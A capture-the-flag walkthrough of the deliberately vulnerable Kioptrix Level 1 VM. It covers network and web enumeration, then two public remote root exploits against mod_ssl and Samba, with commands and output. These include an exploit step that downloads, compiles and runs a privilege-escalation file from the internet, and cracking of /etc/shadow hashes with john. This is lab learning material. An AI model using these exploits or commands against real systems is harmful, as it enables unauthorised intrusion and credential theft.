---
title: Kioptrix Level 1 CTF VM WalkThrough 
date: 2020-06-21 05:45:11 +05:30
categories: [CTF-WriteUP]
tags: [Boot2root, CTF]     # TAG names should always be lowercase
---

**VM : Kioptrix Level 1**   

Download Link : https://www.vulnhub.com/entry/kioptrix-level-1-1,22/   

**Scanning the whole class A network :**  

```shell  
$ nmap -sP 192.168.1.0/24

Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 15:45 UTC
Nmap scan report for 192.168.1.1
Host is up (0.059s latency).
Nmap scan report for 192.168.1.3
Host is up (0.000035s latency).
Nmap scan report for 192.168.1.4
Host is up (0.081s latency).
Nmap scan report for 192.168.1.104
Host is up (0.00051s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 18.67 seconds
```  

Our target is 192.168.1.104.

### Scanning the target :

```shell  
$ nmap -sV -O 192.168.1.104 -oN nmap.scan

Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-07 15:58 UTC
Nmap scan report for 192.168.1.104
Host is up (0.00053s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.7
OS details: Linux 2.4.7
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.35 seconds
```  

Operating System :  Linux 2.4.X | cpe:/o:linux:linux_kernel:2.4.7 | Linux 2.4.7  

### Scanning URL with dirb 

```shell   
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.scan
START_TIME: Tue Apr  7 16:35:19 2020
URL_BASE: http://192.168.1.104/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.1.104/ ----
+ http://192.168.1.104/~operator (CODE:403|SIZE:273)
+ http://192.168.1.104/~root (CODE:403|SIZE:269)
+ http://192.168.1.104/cgi-bin/ (CODE:403|SIZE:272)
+ http://192.168.1.104/index.html (CODE:200|SIZE:2890)
==> DIRECTORY: http://192.168.1.104/manual/
==> DIRECTORY: http://192.168.1.104/mrtg/
==> DIRECTORY: http://192.168.1.104/usage/

---- Entering directory: http://192.168.1.104/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://192.168.1.104/mrtg/ ----
+ http://192.168.1.104/mrtg/index.html (CODE:200|SIZE:17318)

---- Entering directory: http://192.168.1.104/usage/ ----
+ http://192.168.1.104/usage/index.html (CODE:200|SIZE:4810)

-----------------
END_TIME: Tue Apr  7 16:35:41 2020
DOWNLOADED: 13836 - FOUND: 6
```  

### Scanning path/files with dirsearch 

```shell  
Extensions: php, asp, aspx, jsp, html, zip, jar, sql | HTTP method: get | Threads: 10 | Wordlist size: 8678

Error Log: /root/tools/dirsearch/logs/errors-20-04-07_17-33-40.log

Target: http://192.168.1.104

[17:33:40] Starting:
/bin/bash: ]: command not found
[17:33:41] 403 -  277B  - /.htaccess-dev
[17:33:41] 403 -  279B  - /.htaccess-local
[17:33:41] 403 -  268B  - /.hta
[17:33:41] 403 -  277B  - /.htaccess.BAK
[17:33:41] 403 -  279B  - /.htaccess-marco
[17:33:41] 403 -  278B  - /.htaccess.bak1
[17:33:41] 403 -  278B  - /.htaccess.orig
[17:33:41] 403 -  277B  - /.htaccess.old
[17:33:41] 403 -  278B  - /.htaccess.save
[17:33:41] 403 -  277B  - /.htaccess.txt
[17:33:41] 403 -  280B  - /.htaccess.sample
[17:33:41] 403 -  279B  - /.htaccess_extra
[17:33:41] 403 -  276B  - /.htaccess_sc
[17:33:41] 403 -  278B  - /.htaccess_orig
[17:33:41] 403 -  276B  - /.htaccessBAK
[17:33:41] 403 -  276B  - /.htaccessOLD
[17:33:41] 403 -  277B  - /.htaccessOLD2
[17:33:41] 403 -  274B  - /.htaccess~
[17:33:41] 403 -  272B  - /.htgroup
[17:33:41] 403 -  277B  - /.htpasswd-old
[17:33:41] 403 -  278B  - /.htpasswd_test
[17:33:41] 403 -  274B  - /.htpasswds
[17:33:41] 403 -  272B  - /.htusers
[17:33:48] 403 -  272B  - /cgi-bin/
[17:33:49] 403 -  268B  - /doc/
[17:33:49] 403 -  282B  - /doc/stable.version
[17:33:49] 403 -  283B  - /doc/en/changes.html
[17:33:51] 200 -    3KB - /index.html
[17:33:52] 301 -  294B  - /manual  ->  http://127.0.0.1/manual/
[17:33:56] 200 -   27B  - /test.php
[17:33:57] 200 -    5KB - /usage/

Task Completed
```  

Findings :  

```shell  
[17:33:51] 200 -    3KB - /index.html
[17:33:56] 200 -   27B  - /test.php
[17:33:57] 200 -    5KB - /usage/
```  

Now at the `http://192.168.1.104/usage/` there is Webalizer Version 2.01 created page, and search for the gives "Webalizer 2.1.x Buffer Overflow vulnerabilty" which Allows Remote Users to Execute Arbitrary Code on the Server via Reverse DNS Lookups. But i didn't find any exploit for that. However there is an XSS vulnerability. To exploit this just send a curl request and attach payload on the referrer header which can be added to the http://192.168.1.104/usage/usage_DATE.html page. But this is not much useful.

Now try to exploit findings from nmap, which are :   

```shell  
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
```  

### Searching for `Apache 1.3.20` 

The above search lead to `Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow` and we can see that in our target server the ssl server version is 2.8.4 so we can try to exploit this buffer overflow. The exploit can be found at here :  https://www.exploit-db.com/exploits/47080 (newer version). so first we download the exploit and follow the instruction given on that page :  

```shell  
$ ./OpenFuck | grep 1.3.20 | grep RedHat
    0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
    0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2

$ ./OpenFuck 0x6b 192.168.1.104 443 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8088
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo
--15:11:51--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

    0K ...                                                   100% @   3.74 MB/s

15:11:53 (1.87 MB/s) - `ptrace-kmod.c' saved [3921/3921]

/usr/bin/ld: cannot open output file exploit: Permission denied
collect2: ld returned 1 exit status
gcc: file path prefix `/usr/bin' never used
ls
exploit
whoami
root
```  

Try 2 to 3 times if exploit does not work (because the payload download a file "ptrace-kmod.c" from internet). We can get a root shell. Now from here we can get /etc/shadow and /etc/passwd file. Copy them on the system and try to crack the passwords of users with john.  

```shell  
$ unshadow passwdfile shadowfile > crack.passwd.db
$ john crack.passwd.db
```  

### samba service :

There is also samba service is running, (revealed by nmap scan). Now enumerating samba service :

with nbtscan :  

```shell  
nbtscan 192.168.1.104
Doing NBT name scan for addresses from 192.168.1.104

IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
192.168.1.104    KIOPTRIX         <server>  KIOPTRIX         00:00:00:00:00:00
```  

with enum4linux :  

```shell  
./enum4linux.pl 192.168.1.104
WARNING: polenum.py is not in your path.  Check that package is installed and your PATH is sane.
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Apr  7 20:29:41 2020

 ==========================
|    Target Information    |
 ==========================
Target ........... 192.168.1.104
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 192.168.1.104    |
 =====================================================
[+] Got domain/workgroup name: MYGROUP

 =============================================
|    Nbtstat Information for 192.168.1.104    |
 =============================================
Looking up status of 192.168.1.104
    KIOPTRIX        <00> -         B <ACTIVE>  Workstation Service
    KIOPTRIX        <03> -         B <ACTIVE>  Messenger Service
    KIOPTRIX        <20> -         B <ACTIVE>  File Server Service
    ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
    MYGROUP         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
    MYGROUP         <1d> -         B <ACTIVE>  Master Browser
    MYGROUP         <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

    MAC Address = 00-00-00-00-00-00

 ======================================
|    Session Check on 192.168.1.104    |
 ======================================
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```  

Unfortunately the above scan did not gave the version of samba so  i am going to use metasploit auxiliary module to get the samba version   

```shell  
msf5 > search scanner/smb
msf5 > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > show options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.104
RHOSTS => 192.168.1.104
msf5 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.1.104:139     - Host could not be identified: Unix (Samba 2.2.1a)
[*] 192.168.1.104:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```  

The version of samba version is samba 2.2.1a, now by searching "samba 2.2.1a vulnerability" i found "Samba < 2.2.8 (Linux/BSD) - Remote Code Execution" exploit at https://www.exploit-db.com/exploits/10   

Now from here download and try the exploit.   

```shell  
$ wget https://www.exploit-db.com/raw/10
$ mv 10 sambal.c
$ gcc -o sambal sambal.c
$ ./sambal
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
Usage: ./sambal [-bBcCdfprsStv] [host]

-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)
-B <step>       bruteforce steps (default = 300)
-c <ip address> connectback ip address
-C <max childs> max childs for scan/bruteforce mode (default = 40)
-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)
-f              force
-p <port>       port to attack (default = 139)
-r <ret>        return address
-s              scan mode (random)
-S <network>    scan mode
-t <type>       presets (0 for a list)
-v              verbose mode

$ ./sambal -b 0 -v 192.168.1.104
samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
--------------------------------------------------------------
+ Verbose mode.
+ Bruteforce mode. (Linux)
+ Host is running samba.
+ Using ret: [0xbffffed4]
+ Using ret: [0xbffffda8]
+ Using ret: [0xbffffc7c]
+ Using ret: [0xbffffb50]
+ Worked!
--------------------------------------------------------------
*** JE MOET JE MUIL HOUWE
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
ls
exploit
whoami
root
```  

And exploit works. So we have to methods to get root shell in kioptrix1.1.

